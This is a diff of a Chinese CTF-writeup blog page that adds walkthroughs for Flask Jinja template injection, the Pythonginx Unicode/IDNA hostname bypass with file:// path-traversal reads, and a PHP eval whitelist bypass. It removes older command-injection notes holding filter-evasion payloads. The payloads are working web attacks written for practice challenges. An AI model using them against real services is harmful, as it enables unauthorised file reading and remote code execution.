@@ -147,7 +147,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://jingdaqiang.github.io/2021/03/15/buu33-40/">
+    <link itemprop="mainEntityOfPage" href="https://jingdaqiang.github.io/2021/03/15/shrine1/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -161,7 +161,146 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2021/03/15/buu33-40/" class="post-title-link" itemprop="url">buu33-40</a>
+            <a href="/2021/03/15/shrine1/" class="post-title-link" itemprop="url">shrine1</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2021-03-15 21:15:07 / Modified: 21:32:33" itemprop="dateCreated datePublished" datetime="2021-03-15T21:15:07+08:00">2021-03-15</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">import flask</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">app &#x3D; flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[&#39;FLAG&#39;] &#x3D; os.environ.pop(&#39;FLAG&#39;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#39;&#x2F;&#39;)</span><br><span class="line">def index():</span><br><span class="line">    return open(__file__).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#39;&#x2F;shrine&#x2F;&lt;path:shrine&gt;&#39;)</span><br><span class="line">def shrine(shrine):</span><br><span class="line"></span><br><span class="line">    def safe_jinja(s):</span><br><span class="line">        s &#x3D; s.replace(&#39;(&#39;, &#39;&#39;).replace(&#39;)&#39;, &#39;&#39;)</span><br><span class="line">        blacklist &#x3D; [&#39;config&#39;, &#39;self&#39;]  &#x2F;&#x2F;config和self被关进了小黑屋</span><br><span class="line">        return &#39;&#39;.join([&#39;&#123;&#123;% set &#123;&#125;&#x3D;None%&#125;&#125;&#39;.format(c) for c in blacklist]) + s</span><br><span class="line"></span><br><span class="line">    return flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    app.run(debug&#x3D;True)</span><br></pre></td></tr></table></figure>
+<p>可以采用url_for去初始化current_app，从而读取config内容。</p>
+<p>所以直接payload:</p>
+<pre><code>&#123;&#123;url_for.__globals__['current_app'].config&#125;&#125;</code></pre>
+<p>也可以</p>
+<pre><code>/shrine/&#123;&#123;get_flashed_messages.__globals__['current_app'].config['FLAG']&#125;&#125;</code></pre>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://jingdaqiang.github.io/2021/03/15/Pythonginx/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="六公子买单">
+      <meta itemprop="description" content="一头努力的菜鸟">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Daq1ang">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/03/15/Pythonginx/" class="post-title-link" itemprop="url">Pythonginx</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2021-03-15 20:31:21 / Modified: 21:13:11" itemprop="dateCreated datePublished" datetime="2021-03-15T20:31:21+08:00">2021-03-15</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="buu-SUCTF-2019-Pythonginx"><a href="#buu-SUCTF-2019-Pythonginx" class="headerlink" title="buu-[SUCTF 2019]Pythonginx"></a>buu-[SUCTF 2019]Pythonginx</h2><p>源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&#39;&#x2F;getUrl&#39;, methods&#x3D;[&#39;GET&#39;, &#39;POST&#39;])</span><br><span class="line">def getUrl():</span><br><span class="line">    url &#x3D; request.args.get(&quot;url&quot;)</span><br><span class="line">    host &#x3D; parse.urlparse(url).hostname</span><br><span class="line">    if host &#x3D;&#x3D; &#39;suctf.cc&#39;:</span><br><span class="line">        return &quot;我扌 your problem? 111&quot;</span><br><span class="line">    parts &#x3D; list(urlsplit(url))</span><br><span class="line">    host &#x3D; parts[1]</span><br><span class="line">    if host &#x3D;&#x3D; &#39;suctf.cc&#39;:</span><br><span class="line">        return &quot;我扌 your problem? 222 &quot; + host</span><br><span class="line">    newhost &#x3D; []</span><br><span class="line">    for h in host.split(&#39;.&#39;):</span><br><span class="line">        newhost.append(h.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;))</span><br><span class="line">    parts[1] &#x3D; &#39;.&#39;.join(newhost)</span><br><span class="line">    #去掉 url 中的空格</span><br><span class="line">    finalUrl &#x3D; urlunsplit(parts).split(&#39; &#39;)[0]</span><br><span class="line">    host &#x3D; parse.urlparse(finalUrl).hostname</span><br><span class="line">    if host &#x3D;&#x3D; &#39;suctf.cc&#39;:</span><br><span class="line">        return urllib.request.urlopen(finalUrl).read()</span><br><span class="line">    else:</span><br><span class="line">        return &quot;我扌 your problem? 333&quot;</span><br></pre></td></tr></table></figure>
+<p>大佬说：这道题用的是blackhat议题之一HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization，</p>
+<p>这个题的代码说：提交一个url，前两个if不同，第三个相同，host构造方法不同，但要都等于</p>
+<pre><code>suctf.cc</code></pre>
+<p>这也是议题要说明的：当URL 中出现一些特殊字符的时候，输出的结果可能不在预期(选择替换最后一个字符c)</p>
+<p>接着我们只需要按照getUrl函数写出爆破脚本即可得到我们能够逃逸的构造语句了</p>
+<p>偷大佬的脚本：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">from urllib.parse import urlparse,urlunsplit,urlsplit</span><br><span class="line">from urllib import parse</span><br><span class="line">def get_unicode():</span><br><span class="line">    for x in range(65536):</span><br><span class="line">        uni&#x3D;chr(x)</span><br><span class="line">        url&#x3D;&quot;http:&#x2F;&#x2F;suctf.c&#123;&#125;&quot;.format(uni)&#x2F;&#x2F;最后一个c</span><br><span class="line">        try:</span><br><span class="line">            if getUrl(url):</span><br><span class="line">                print(&quot;str: &quot;+uni+&#39; unicode: \\u&#39;+str(hex(x))[2:])</span><br><span class="line">        except:</span><br><span class="line">            pass</span><br><span class="line"> </span><br><span class="line">def getUrl(url):</span><br><span class="line">    url&#x3D;url</span><br><span class="line">    host&#x3D;parse.urlparse(url).hostname</span><br><span class="line">    if host &#x3D;&#x3D; &#39;suctf.cc&#39;:</span><br><span class="line">        return False</span><br><span class="line">    parts&#x3D;list(urlsplit(url))</span><br><span class="line">    host&#x3D;parts[1]</span><br><span class="line">    if host &#x3D;&#x3D; &#39;suctf.cc&#39;:</span><br><span class="line">        return False</span><br><span class="line">    newhost&#x3D;[]</span><br><span class="line">    for h in host.split(&#39;.&#39;):</span><br><span class="line">        newhost.append(h.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;))</span><br><span class="line">    parts[1]&#x3D;&#39;.&#39;.join(newhost)</span><br><span class="line">    finalUrl&#x3D;urlunsplit(parts).split(&#39; &#39;)[0]</span><br><span class="line">    host&#x3D;parse.urlparse(finalUrl).hostname</span><br><span class="line">    if host &#x3D;&#x3D; &#39;suctf.cc&#39;:</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        return False</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">if __name__&#x3D;&#x3D;&#39;__main__&#39;:</span><br><span class="line">    get_unicode()</span><br></pre></td></tr></table></figure>
+<p>运行得</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">str: ℂ unicode: \u2102</span><br><span class="line">str: ℭ unicode: \u212d</span><br><span class="line">str: Ⅽ unicode: \u216d</span><br><span class="line">str: ⅽ unicode: \u217d</span><br><span class="line">str: Ⓒ unicode: \u24b8</span><br><span class="line">str: ⓒ unicode: \u24d2</span><br><span class="line">str: Ｃ unicode: \uff23</span><br><span class="line">str: ｃ unicode: \uff43</span><br></pre></td></tr></table></figure>
+<p>题目提示nginx，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">配置文件存放目录：&#x2F;etc&#x2F;nginx</span><br><span class="line">主配置文件：&#x2F;etc&#x2F;nginx&#x2F;conf&#x2F;nginx.conf</span><br><span class="line">管理脚本：&#x2F;usr&#x2F;lib64&#x2F;systemd&#x2F;system&#x2F;nginx.service</span><br><span class="line">模块：&#x2F;usr&#x2F;lisb64&#x2F;nginx&#x2F;modules</span><br><span class="line">应用程序：&#x2F;usr&#x2F;sbin&#x2F;nginx</span><br><span class="line">程序默认存放位置：&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html</span><br><span class="line">日志默认存放位置：&#x2F;var&#x2F;log&#x2F;nginx</span><br><span class="line">配置文件目录为：&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf</span><br></pre></td></tr></table></figure>
+<p>尝试读nginx的配置文件</p>
+<pre><code>?url=file://suctf.c%E2%84%82/../../../../..//usr/local/nginx/conf/nginx.conf</code></pre>
+<p>读到了flag的位置：/usr/fffffflag</p>
+<pre><code>?url=file://suctf.c%E2%84%82/../../../../..//usr/fffffflag</code></pre>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://jingdaqiang.github.io/2021/03/15/buu33-48/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="六公子买单">
+      <meta itemprop="description" content="一头努力的菜鸟">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Daq1ang">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/03/15/buu33-48/" class="post-title-link" itemprop="url">buu33-40</a>
         </h2>
 
         <div class="post-meta">
@@ -178,7 +317,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2021-03-19 11:52:51" itemprop="dateModified" datetime="2021-03-19T11:52:51+08:00">2021-03-19</time>
+                <time title="Modified: 2021-04-21 10:37:24" itemprop="dateModified" datetime="2021-04-21T10:37:24+08:00">2021-04-21</time>
               </span>
 
           
@@ -239,6 +378,19 @@
 
 b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</code></pre>
 <p>然后利用cmd指令找flag，查目录，过滤了ls，可以用dir(也可以用l\s绕过过滤 )，查看根目录dir /发现有flag，用ca\t /flag绕过过滤查看flag.</p>
+<h2 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math"></a>[CISCN 2019 初赛]Love Math</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">&#x2F;&#x2F;听说你很喜欢数学，不知道你是否爱它胜过爱flag</span><br><span class="line">if(!isset($_GET[&#39;c&#39;]))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    &#x2F;&#x2F;例子 c&#x3D;20-1</span><br><span class="line">    $content &#x3D; $_GET[&#39;c&#39;];</span><br><span class="line">    if (strlen($content) &gt;&#x3D; 80) &#123;</span><br><span class="line">        die(&quot;太长了不会算&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist &#x3D; [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;&#96;&#39;, &#39;\[&#39;, &#39;\]&#39;];</span><br><span class="line">    foreach ($blacklist as $blackitem) &#123;</span><br><span class="line">        if (preg_match(&#39;&#x2F;&#39; . $blackitem . &#39;&#x2F;m&#39;, $content)) &#123;</span><br><span class="line">            die(&quot;请不要输入奇奇怪怪的字符&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;常用数学函数http:&#x2F;&#x2F;www.w3school.com.cn&#x2F;php&#x2F;php_ref_math.asp</span><br><span class="line">    $whitelist &#x3D; [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;, &#39;base_convert&#39;, &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;];</span><br><span class="line">    preg_match_all(&#39;&#x2F;[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*&#x2F;&#39;, $content, $used_funcs);  </span><br><span class="line">    foreach ($used_funcs[0] as $func) &#123;</span><br><span class="line">        if (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            die(&quot;请不要输入奇奇怪怪的函数&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;帮你算出答案</span><br><span class="line">    eval(&#39;echo &#39;.$content.&#39;;&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>要求：</p>
+<p>传参c长度不超过80</p>
+<p>payload中不能包含’ ‘, ‘\t’, ‘\r’, ‘\n’,’’’, ‘“‘, ‘`’, ‘[‘, ‘]’ 这些字符</p>
+<p>payload中不能有不是$whitelist白名单里面的单词出现</p>
+<p>php概念：把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数比如下面的代码会执行 system(‘ls’);</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$a&#x3D;&#39;system&#39;;</span><br><span class="line">$a(&#39;ls&#39;);</span><br></pre></td></tr></table></figure>
+<p>16进制就只有a-f字母，但是36进制包含所有小写字母，可以通过10进制纯数字转换成36进制字母来构造我们的payload，36进制 同样没有符号，不过符号可以通过异或去构造</p>
+<p>如果直接使用读取文件函数file_get_contents中包含下划线不在我们36进制中,并且base_convert第一个参数太长会溢出，也就是10进制数没法无限大。</p>
+<p>最后的方法是借助getallheader()来控制请求头，再通过添加请求头字段来读取flag.php</p>
+<p>getallheader()返回的是数组，要从数组里面取数据用array[‘xxx’],但是无奈[]被waf了,因为{}中是可以带数字的，这里用getallheader(){1}可以返回自定义头1里面的内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">正常形式：</span><br><span class="line">?c&#x3D;exec(getallheaders()&#123;1&#125;)</span><br><span class="line">base_convert转换后：</span><br><span class="line">?c&#x3D;$pi&#x3D;base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)()&#123;1&#125;)</span><br></pre></td></tr></table></figure>
+<p>(进制转换工具：<a target="_blank" rel="noopener" href="https://tool.oschina.net/hexconvert">https://tool.oschina.net/hexconvert</a>)</p>
 
       
     </div>
@@ -627,108 +779,6 @@ resource=flag.php</code></pre>
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://jingdaqiang.github.io/2021/03/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="六公子买单">
-      <meta itemprop="description" content="一头努力的菜鸟">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Daq1ang">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/03/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="post-title-link" itemprop="url">命令执行</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2021-03-03 20:50:21" itemprop="dateCreated datePublished" datetime="2021-03-03T20:50:21+08:00">2021-03-03</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2021-03-27 09:39:30" itemprop="dateModified" datetime="2021-03-27T09:39:30+08:00">2021-03-27</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>常用命令</p>
-<p>system(‘ls’) : 列举当前目录下的所有文件</p>
-<p>system(“find / -name flag<em>”)：查找所有文件名匹配flag</em>的文件</p>
-<p>system(“cat $(find / -name flag*)”)：打印所有文件名匹配flag*的文件</p>
-<h2 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h2><p>php语句最后的分号可用&gt;代替</p>
-<p>?c=system(‘ls’);查目录</p>
-<p>shell命令：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/BaiYiShaoNian/p/4831022.html">https://www.cnblogs.com/BaiYiShaoNian/p/4831022.html</a></p>
-<p>cp命令：复制 </p>
-<ul>
-<li><p>cp a.txt b.txt : 把文件a的内容复制到b文件</p>
-</li>
-<li><p>cp a.txt ./test : 把文件a复制到text目录下</p>
-</li>
-<li><p>cp -a test test2：递归的把目录test下所有文件（包括隐藏的文件）复制到新的目录 test2</p>
-</li>
-</ul>
-<p>把flag.txt内容搞到1.txt中</p>
-<p>?c=system(“cp fla?.txt 1.txt”);</p>
-<p>flag被过滤，用?代替g,(占位符?可代替任意字符)</p>
-<hr>
-<h2 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h2><p>过滤了flag,system和php</p>
-<p>payload:</p>
-<pre><code>?c=`cp fla?.??? 1.txt`</code></pre>
-<p>``反引号在php中和system一样，代表命令执行</p>
-<hr>
-<h2 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h2><p><img src="/2021/03/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/A%E7%A7%801.0.png" alt="A秀1.0.png"></p>
-<p>eval执行</p>
-<p>在之前的基础上还过滤了空格</p>
-<p>payload:</p>
-<pre><code>?c=eval($_GET[1]);&amp;1=system(&#39;cat flag.php&#39;);</code></pre>
-<p>1逃逸出了eval，不属于c，不接受过滤,也可以将cat用tac代替，则不需查源代码，可直接读取flag</p>
-<p>也可以编码绕过空格</p>
-<pre><code>?c=echo%09`tac%09*`;</code></pre>
-<hr>
-<h2 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h2><p><img src="/2021/03/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/A%E7%A7%801.1.png" alt="A秀1.0.png"><br>在之前的基础上主要过滤了分号;左扩号( 反引号，echo等。</p>
-<p>利用Include函数</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;include$_POST[a]?&gt;</span><br><span class="line"></span><br><span class="line">post:a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
-<hr>
-<h2 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math"></a>[CISCN 2019 初赛]Love Math</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">&#x2F;&#x2F;听说你很喜欢数学，不知道你是否爱它胜过爱flag</span><br><span class="line">if(!isset($_GET[&#39;c&#39;]))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    &#x2F;&#x2F;例子 c&#x3D;20-1</span><br><span class="line">    $content &#x3D; $_GET[&#39;c&#39;];</span><br><span class="line">    if (strlen($content) &gt;&#x3D; 80) &#123;</span><br><span class="line">        die(&quot;太长了不会算&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist &#x3D; [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;&#96;&#39;, &#39;\[&#39;, &#39;\]&#39;];</span><br><span class="line">    foreach ($blacklist as $blackitem) &#123;</span><br><span class="line">        if (preg_match(&#39;&#x2F;&#39; . $blackitem . &#39;&#x2F;m&#39;, $content)) &#123;</span><br><span class="line">            die(&quot;请不要输入奇奇怪怪的字符&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;常用数学函数http:&#x2F;&#x2F;www.w3school.com.cn&#x2F;php&#x2F;php_ref_math.asp</span><br><span class="line">    $whitelist &#x3D; [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;, &#39;base_convert&#39;, &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;];</span><br><span class="line">    preg_match_all(&#39;&#x2F;[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*&#x2F;&#39;, $content, $used_funcs);  </span><br><span class="line">    foreach ($used_funcs[0] as $func) &#123;</span><br><span class="line">        if (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            die(&quot;请不要输入奇奇怪怪的函数&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;帮你算出答案</span><br><span class="line">    eval(&#39;echo &#39;.$content.&#39;;&#39;);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="https://jingdaqiang.github.io/2021/03/03/buu-piapiapia/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -926,92 +976,6 @@ $user-&gt;update_profile($username, serialize($profile));</code></pre>
           <p>今天自学node.js，先康康《菜鸟笔记》。从《菜鸟笔记》中学习，然后写一些感悟和自己的看法。<br>冲冲冲！</p>
 <h2 id="Node-js创建第一个应用"><a href="#Node-js创建第一个应用" class="headerlink" title="Node.js创建第一个应用"></a>Node.js创建第一个应用</h2><p><img src="images/nodejs1.0.png" alt="nodejs1.0"><br>说node.js可以完成后端代码的一条龙服务     </p>
